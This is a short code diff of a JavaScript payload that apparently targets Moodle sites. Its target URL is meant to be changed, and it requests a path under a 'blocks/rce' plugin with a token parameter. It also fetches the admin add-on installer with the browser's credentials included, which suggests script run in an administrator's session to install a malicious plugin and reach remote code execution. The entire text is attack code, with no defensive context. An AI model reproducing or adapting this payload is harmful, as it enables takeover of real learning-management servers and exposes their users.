@@ -1,5 +1,7 @@
-  const URL = "https://daviddoaa.me/moodle/"; // Change this to your target URL 
-  fetch(URL + "blocks/rce/lang/en/block_rce.php?token=mail");
+const Http = new XMLHttpRequest();  
+const URL = "https://daviddoaa.me/moodle/"; // Change this to your target URL 
+Http.open("GET", URL + "blocks/rce/lang/en/block_rce.php?token=mail");
+Http.send();
   fetch(URL + "admin/tool/installaddon/index.php", {
     credentials: "include",
   })
